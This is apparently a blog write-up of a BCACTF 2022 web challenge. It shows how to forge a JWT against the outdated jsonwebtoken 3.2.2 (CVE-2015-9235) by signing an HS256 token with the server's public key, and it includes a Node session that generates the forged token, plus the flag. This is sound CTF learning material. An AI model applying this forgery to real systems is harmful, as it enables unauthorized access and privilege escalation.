---
layout: post
title:  "Jason's Tarot 3 (Web Challenge Writeup) -- BCACTF 3.0 2022"
date:   2022-06-06
image: /bcactf22/logo.png
---
<p class="intro"><span class="dropcap">B</span>CACTF 2022 took place on June 3 to 6, 2022. It was 72 hours of challenges and exceptional support from the organizers. This WEB challenge is perfect to demonstrate why it is important to keep all the software we use up to date. The security of the software supply chain is of great importance following multiple far-reaching cyber attacks in recent years.</p>


#### Challenge Description: 

<figure>
        <img src="/assets/img/bcactf22/chall2.png" alt="" />
        <figcaption>Challenge Description</figcaption>
</figure>

We see that we were given three files to review: a public key certificate, a package.json and the server.js, 

We review the server.js

<figure>
        <img src="/assets/img/bcactf22/server-js.png" alt="" />
        <figcaption>server.js</figcaption>
</figure>

and, most important, review the package.json

<figure>
        <img src="/assets/img/bcactf22/package-json.png" alt="" />
        <figcaption>package.json</figcaption>
</figure>

We started loading the page with Burpsuit intercepted ON to capture the JWT 

<figure>
        <img src="/assets/img/bcactf22/web.png" alt="" />
        <figcaption>Main site</figcaption>
</figure>

To decode the header and payload parts we use a web tool called [jwt.io](https://jwt.io)

<figure>
        <img src="/assets/img/bcactf22/jwt-io.png" alt="" />
        <figcaption>jwt_io</figcaption>
</figure>

Like the [Jason's Web Tarot 2](https://leonuz.github.io/blog/Jasons-Web-Tarot-2/) challenge, we need to become subscribed users to the application, to do this, we need to change (in the JWT) the value of the `"isSubscriber"` variable from its current value, `False`, to a new one, `True`. 

In the review of the package.json file, we notice that the *jsonwebtoken* version its 3.2.2, this version its outdated and vulnerable!!

<figure>
        <img src="/assets/img/bcactf22/CVE-2015-9235.png" alt="" />
        <figcaption>CVE-2015-9235</figcaption>
</figure>

So in order to exploit that vulnerability, we need to build a new HMAC(HS256) token using the public key as a secret to it. 
We used nodejs jsonwebtoken module to do this 


{%- highlight bash -%}
┌──(leonuz㉿sniperhack)-[~/Downloads/ctf/bcactf/JWT]
└─$ node
Welcome to Node.js v16.14.2.
Type ".help" for more information.
> const jwt = require('jsonwebtoken')
undefined
> var fs = require('fs')
undefined
> var publicKey = fs.readFileSync('./public.pem');
undefined
> var token = jwt.sign({ "isSubscriber": true, "iat": 1654387812  }, publicKey, { algorithm:'HS256'});
undefined
> console.log(token)
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc1N1YnNjcmliZXIiOnRydWUsImlhdCI6MTY1NDM4NzgxMn0.jAwGD9e6JahpPHJZMfULiToDy12M9WaMoI_18hSZDko
undefined
{%- endhighlight -%}

Now we have the new JWT

<figure>
        <img src="/assets/img/bcactf22/burp-req.png" alt="" />
        <figcaption>New JWT token</figcaption>
</figure>


Now, all that remains is to substitute the new token in the request and send the new request. 
We use the function ["Repeatear" of Burpsuit](https://portswigger.net/burp/documentation/desktop/tools/repeater/using) to do that.

<figure>
        <img src="/assets/img/bcactf22/burp-flag2.png" alt="" />
        <figcaption>Send new Token and get the Flag</figcaption>
</figure>


And we get the flag!  

<figure>
        <img src="/assets/img/bcactf22/flag2.png" alt="" />
        <figcaption>Flag</figcaption>
</figure>


#### bcactf{w3_d3f1n3tly_d1dnt_h4v3_t0_ch4ng3_th1s_101010101010}

- - -
## Final Notes.  

[NIST](https://www.nist.gov/) recently released several key deliverables relating to cybersecurity. These focus on secure software development and new consumer labeling programs as contemplated by President Biden’s Executive Order 14028, which seeks to implement multiple new practices to improve the Nation’s cybersecurity.

More Info [here](https://www.jdsupra.com/legalnews/nist-releases-new-guidance-on-software-8128301/)

- - -
Thanks [BCACTF](https://www.bcactf.com/) for this great CTF, congratulations to the whole team!.  

For fun and knowledge, always think out of the box! :)

<figure>
        <img src="/assets/img/bcactf22/cert.png" alt="" />
</figure>
